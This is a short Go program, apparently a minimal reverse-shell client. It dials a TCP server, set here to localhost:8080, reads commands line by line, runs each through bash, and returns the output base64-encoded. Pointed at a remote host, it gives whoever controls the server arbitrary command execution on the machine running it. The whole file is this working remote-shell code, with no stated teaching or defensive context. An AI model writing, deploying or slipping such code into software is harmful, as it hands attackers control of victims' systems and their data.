package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
)

const (
	connHost = "localhost"
	connPort = "8080"
	connType = "tcp"
)

func main() {
	fmt.Println("Starting " + connType + " CLIENT connection on " + connHost + ":" + connPort)
	conn, err := net.Dial(connType, connHost+":"+connPort)

	if err != nil {
		fmt.Println("Error connecting:", err.Error())
		os.Exit(1)
	}

	for {
		comando, _ := bufio.NewReader(conn).ReadString('\n')
		resultado := execCodigoERetornaResultado(string(comando))
		fmt.Fprint(conn, resultado)

	}
}

func execCodigoERetornaResultado(comando string) string {
	c := exec.Command("/usr/bin/bash", "-c", comando)
	out, err := c.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return err.Error()
	}
	//fmt.Println(string(out))
	outputEnc := b64.StdEncoding.EncodeToString([]byte(out))
	return string(outputEnc + "\n")
}
